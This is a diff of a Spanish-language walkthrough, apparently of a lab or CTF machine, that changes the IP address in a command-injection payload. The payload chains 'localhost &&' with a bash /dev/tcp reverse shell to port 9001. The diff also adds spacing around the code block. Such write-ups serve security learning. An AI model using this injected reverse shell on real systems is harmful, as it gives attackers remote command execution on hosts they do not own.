@@ -32,9 +32,11 @@ Iremos a preparar una revershell, usaremos && y despues la revshell
 
 
 <img width="1185" height="659" alt="image" src="https://github.com/user-attachments/assets/e5269586-47ca-486c-9866-da930c69658f" />
+
 ```ruby
-localhost && bash -c 'exec 5<>/dev/tcp/192.168.91.154/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
+localhost && bash -c 'exec 5<>/dev/tcp/10.0.2.15/9001;cat <&5 | while read line; do $line 2>&5 >&5; done'
 ```
+
 ya tendriamos la conexion con esto:
 
 <img width="476" height="166" alt="image" src="https://github.com/user-attachments/assets/78e83ecd-2821-4bb5-baba-b841fd86163a" />
